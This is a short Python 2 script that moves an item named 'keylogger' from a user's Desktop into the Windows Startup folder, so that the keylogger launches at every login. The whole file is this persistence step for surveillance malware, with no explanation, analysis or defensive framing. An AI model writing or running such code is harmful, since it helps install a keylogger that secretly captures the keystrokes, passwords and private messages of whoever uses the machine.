import shutil 


original = r'C:\Users\pcuser\Desktop\keylogger'
target = r'C:\Users\pcuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

shutil.move(original,target)

print ""